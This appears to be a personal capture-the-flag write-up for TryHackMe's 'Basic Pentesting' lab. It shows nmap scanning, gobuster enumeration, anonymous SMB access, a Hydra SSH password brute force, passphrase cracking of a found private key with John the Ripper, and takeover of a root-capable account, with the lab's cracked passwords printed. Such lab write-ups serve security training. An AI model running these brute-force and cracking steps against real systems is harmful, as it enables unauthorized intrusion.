> Sun 3 Aug 2025
> al3xx


![[Write-ups/TryHackMe/Linux/img/s8.png|350]]

# Basic Pentesting [Link](https://tryhackme.com/room/basicpentestingjt)

## 1. Reconnaissance
### TCP Scan
**command  :**
```bash
sudo nmap -sC -sV -T4 -oN nmap/nmap.txt 10.10.23.91
```

**Open ports**

| Port | Service     | Version                          |
| ---- | ----------- | -------------------------------- |
| 80   | http        | Apache httpd 2.4.41 ((Ubuntu))   |
| 22   | ssh         | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 139  | netbios-ssn | Samba smbd 4                     |
| 445  | netbios-ssn | Samba smbd 4                     |
| 8009 | ajp13       | Apache Jserv (Protocol v1.3)     |

## 2. Enumeration
### HTTP Enumeration
- Port **80** is open.
- The website initially had no visible content.
- Used **Gobuster** to discover hidden directories:

**command  :**
```bash
gobuster dir -u http://10.10.23.91 -w /wordlist/wordlist.txt
```

- Found `/development` 
- Inside `/development` found two files: `dev.txt` and `j.txt`, containing a conversation between `-K` and `-J`.
- From these, learned that `-J` (user Jan) has a weak password.

### SMB Enumeration
- Ports **139** and **445** are open, indicating Samba file shares.
- Enumerated shares with:
**commands :**
```bash
$ smbclient -L //10.10.23.91/Anonymous -N
```
Found shares:
```

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
```
Connected to `Anonymous` share:
```
$ smbclient //10.10.23.91/Anonymous -N
```

Found `staff.txt`, revealing two users: **Kay** and **Jan**.

## 3. Exploitation
- Using info from `/development` and `staff.txt`, confirmed `-J` is user **Jan**.
- Brute-forced Janâ€™s SSH password with Hydra:
**command :**
```bash
$ hydra -l Jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.23.91
```
result
```
[22][ssh] host: 10.10.23.91   login: jan   password: armando
```
Logged in as Jan via SSH:
```bash
$ ssh jan@10.10.23.91
```

## 4. Post-Exploitation
- Explored `/home/kay/.ssh` directory and found a private key file `rsa.txt`
- The private key is password protected.
- Converted the private key for John the Ripper using `ssh2john`:
```bash
ssh2john rsa.txt > new.txt
```
- Cracked the private key password with John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt new.txt
```
**Password found:** `beeswax`

## 5. Privilege Escalation
Logged in as Kay using the private key and password:
```bash
ssh -i /tmp/priv.txt kay@10.10.106.25
```

- Enter the password:  
    `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
- Kay has **root privileges**.
